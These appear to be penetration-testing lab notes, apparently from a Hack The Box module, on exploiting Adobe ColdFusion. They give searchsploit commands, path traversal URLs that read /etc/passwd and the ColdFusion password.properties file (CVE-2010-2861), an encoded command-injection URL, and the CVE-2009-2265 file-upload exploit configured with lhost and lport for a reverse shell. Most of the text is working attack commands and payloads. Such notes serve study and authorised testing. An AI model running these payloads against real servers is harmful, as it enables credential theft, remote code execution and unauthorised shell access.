```
searchsploit adobe coldfusion
```

## Directory Traversal

CVE-2010-2861 allows the following path traversal
- CFIDE/administrator/settings/mappings.cfm
- logging/settings.cfm
- datasources/index.cfm
- j2eepackaging/editarchive.cfm
- CFIDE/administrator/enter.cfm
```
http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../etc/passwd
```

```
searchsploit -p 14641
```


## Coldfusion - Exploitation
```
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
```

## Coldfusion - Exploitation
```
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```
- Since we get the contents, target is vulnerable to CVE-2010-2861


## Unauthenticated RCE
```
# Decoded: http://www.example.com/index.cfm?; echo "This server has been compromised!" > C:\compromise.txt

http://www.example.com/index.cfm?%3B%20echo%20%22This%20server%20has%20been%20compromised%21%22%20%3E%20C%3A%5Ccompromise.txt
```

**CVE-2009-2265
```
http://www.example.com/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```
```
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

**Exploit Modification
```
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.14.55' # HTB VPN IP
    lport = 4444 # A port not in use on localhost
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port
    filename = uuid.uuid4().hex
```

**Exploitation
```
python3 50057.py
```
- Will return reverse shell
